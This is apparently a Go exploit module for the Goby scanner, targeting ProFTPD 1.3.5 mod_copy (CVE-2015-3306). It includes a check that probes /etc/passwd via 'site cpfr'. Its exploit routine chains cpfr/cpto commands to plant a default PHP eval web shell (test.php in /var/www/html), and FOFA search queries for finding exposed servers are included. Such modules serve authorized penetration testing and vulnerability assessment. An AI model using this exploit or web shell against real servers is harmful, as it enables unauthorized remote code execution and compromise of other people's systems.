package exploits

import (
	"bufio"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"strings"
)

func init() {
	expJson := `{
    "Name": "ProFTPD 1.3.5 mod_copy File Write (CVE-2015-3306)",
    "Description": "The mod_copy module in ProFTPD 1.3.5 allows remote attackers to read and write to arbitrary files via the site cpfr and site cpto commands.",
    "Impact": "ProFTPD 1.3.5 mod_copy File Write (CVE-2015-3306)",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix this security issue, the patch access link: <a href=\"http://bugs.proftpd.org/show_bug.cgi?id=4169\">http://bugs.proftpd.org/show_bug.cgi?id=4169</a></p>",
    "Product": "ProFTPD",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "ProFTPd 1.3.5 版本 mod_copy 模块任意命令执行漏洞（CVE-2015-3306）",
            "Description": "<p>ProFTPD是ProFTPD团队的一套开源的FTP服务器软件。该软件具有可配置性强、安全、稳定等特点。</p><p>ProFTPD 1.3.5版本的mod_copy模块中存在安全漏洞。远程攻击者可借助site cpfr和site cpto命令利用该漏洞读取和写入任意文件。</p>",
            "Impact": "<p>ProFTPD 1.3.5版本的mod_copy模块中存在安全漏洞。远程攻击者可借助site cpfr和site cpto命令利用该漏洞读取和写入任意文件。&nbsp;<br></p>",
            "Recommendation": "<p>目前厂商已经发布了升级补丁以修复此安全问题，补丁获取链接：<a href=\"http://bugs.proftpd.org/show_bug.cgi?id=4169\" target=\"_blank\">http://bugs.proftpd.org/show_bug.cgi?id=4169</a><br></p>",
            "Product": "ProFTPD",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "ProFTPD 1.3.5 mod_copy File Write (CVE-2015-3306)",
            "Description": "The mod_copy module in ProFTPD 1.3.5 allows remote attackers to read and write to arbitrary files via the site cpfr and site cpto commands.",
            "Impact": "ProFTPD 1.3.5 mod_copy File Write (CVE-2015-3306)",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix this security issue, the patch access link: <a href=\"http://bugs.proftpd.org/show_bug.cgi?id=4169\" target=\"_blank \">http://bugs.proftpd.org/show_bug.cgi?id=4169</a><br></p>",
            "Product": "ProFTPD",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "((protocol=ftp && banner=\"ProFTPD\") || header=\"realm=\\\"ProFTPD\" || banner=\"realm=\\\"ProFTPD\" || banner=\"ProFTP-Server\" || banner=\"proftp server\" || (banner=\"550 SSL/TLS required on the control channel\" && banner=\"220 \"))",
    "GobyQuery": "((protocol=ftp && banner=\"ProFTPD\") || header=\"realm=\\\"ProFTPD\" || banner=\"realm=\\\"ProFTPD\" || banner=\"ProFTP-Server\" || banner=\"proftp server\" || (banner=\"550 SSL/TLS required on the control channel\" && banner=\"220 \"))",
    "Author": "mengzd@foxmail.com",
    "Homepage": "http://www.proftpd.org/",
    "DisclosureDate": "2021-06-08",
    "References": [
        "https://gobies.org/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "10.0",
    "CVEIDs": [
        "CVE-2015-3306"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-201505-070"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "UploadPath",
            "type": "input",
            "value": "/var/www/html/",
            "show": ""
        },
        {
            "name": "UploadContent",
            "type": "input",
            "value": "<?php echo eval($_GET['cmd']); ?>",
            "show": ""
        },
        {
            "name": "FileName",
            "type": "input",
            "value": "test.php",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10225"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			conn, err := httpclient.GetTCPConn(u.HostInfo)
			if err != nil {
				log.Println("[WARNING] tcp conn establish failed", err)
			}
			if _, err := bufio.NewReader(conn).ReadString('\n'); err == nil {
				fmt.Fprintf(conn, "site cpfr /etc/passwd\n")
				if resp, err := bufio.NewReader(conn).ReadString('\n'); err == nil {
					if strings.Contains(resp, "350 File or directory exists") {
						return true
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			path := ss.Params["UploadPath"].(string)
			payload := ss.Params["UploadContent"].(string)
			filename := ss.Params["FileName"].(string)
			fmt.Println(expResult.HostInfo.HostInfo)
			conn, err := httpclient.GetTCPConn(expResult.HostInfo.HostInfo)
			if err != nil {
				log.Println("[WARNING] tcp conn establish failed", err)
			}
			if _, err := bufio.NewReader(conn).ReadString('\n'); err == nil {
				fmt.Fprintf(conn, "site cpfr /proc/self/cmdline\n")
				if _, err := bufio.NewReader(conn).ReadString('\n'); err == nil {
					fmt.Fprintf(conn, "site cpto /tmp/."+payload+"\n")
					if _, err := bufio.NewReader(conn).ReadString('\n'); err == nil {
						fmt.Fprintf(conn, "site cpfr /tmp/."+payload+"\n")
						if _, err := bufio.NewReader(conn).ReadString('\n'); err == nil {
							fmt.Fprintf(conn, "site cpto "+path+"/"+filename+"\n")
							if resp, err := bufio.NewReader(conn).ReadString('\n'); err == nil {
								if strings.Contains(resp, "250 Copy successful") {
									expResult.Success = true
									expResult.Output += path + filename + " Uploaded successfully"
								}
							}
						}
					}
				}
			}
			return expResult
		},
	))
}
